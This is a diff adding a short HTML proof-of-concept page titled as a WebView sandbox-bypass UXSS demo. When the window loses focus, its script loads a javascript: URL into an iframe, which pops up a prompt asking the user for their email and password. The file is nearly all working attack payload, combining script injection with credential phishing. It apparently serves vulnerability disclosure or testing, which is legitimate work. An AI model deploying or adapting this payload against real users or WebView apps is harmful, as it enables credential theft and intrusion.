@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sandbox Bypass WebView UXSS Demo</title>
+  <style>
+    iframe {
+      width: 80%;
+      height: 300px;
+      border: 1px solid #ccc;
+      margin-top: 20px;
+    }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>Click Here</h1>
+  <iframe id="iframe"></iframe>
+
+  <script>
+    window.onblur = function () {
+      // Payload triggers when the user leaves focus
+      document.getElementById("iframe").src =
+        "javascript:prompt('Demo UXSS Payload:\\n\\nPlease enter your email and password:', 'E-mail / Password');";
+    };
+  </script>
+</body>
+</html>
